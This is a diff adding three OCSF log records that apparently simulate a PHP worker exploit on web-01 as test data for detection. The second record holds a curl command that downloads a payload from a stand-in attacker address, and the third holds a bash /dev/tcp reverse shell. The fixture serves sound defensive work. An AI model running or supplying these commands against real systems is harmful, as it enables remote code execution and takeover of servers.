@@ -1,0 +1,33 @@
+// OCSF 1.9 events for a PHP2Shell intrusion on web-01.
+{
+  time: 2026-07-01T10:00:00Z,
+  metadata: {version: "1.9.0", uid: "web-01-1"},
+  class_uid: 0, category_uid: 0, activity_id: 0, type_uid: 0,
+  device: {hostname: "web-01", os: {type_id: 200, name: "Linux"}},
+  // Stage seq0: A crafted multipart request crashes a PHP worker.
+  message: "kernel: php-fpm8.3[4242]: segfault at 0 ip 00007f3a9c2b1e40 sp 00007ffd4f0e2a18 error 4 in libphp.so",
+}
+{
+  time: 2026-07-01T10:02:00Z,
+  metadata: {version: "1.9.0", uid: "web-01-2"},
+  class_uid: 1007, category_uid: 1, activity_id: 1, type_uid: 100701,
+  device: {hostname: "web-01", os: {type_id: 200, name: "Linux"}},
+  // Stage seq2: The exploited worker spawns a shell that stages a payload.
+  process: {
+    file: {path: "/bin/sh", name: "sh"},
+    cmd_line: "sh -c curl -fsSL http://203.0.113.7/a.sh -o /tmp/a.sh",
+    parent_process: {file: {path: "/usr/sbin/php-fpm8.3", name: "php-fpm8.3"}},
+  },
+}
+{
+  time: 2026-07-01T10:03:00Z,
+  metadata: {version: "1.9.0", uid: "web-01-3"},
+  class_uid: 1007, category_uid: 1, activity_id: 1, type_uid: 100701,
+  device: {hostname: "web-01", os: {type_id: 200, name: "Linux"}},
+  // Stage seq3: The payload opens a reverse shell.
+  process: {
+    file: {path: "/bin/bash", name: "bash"},
+    cmd_line: "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+    parent_process: {file: {path: "/bin/sh", name: "sh"}},
+  },
+}
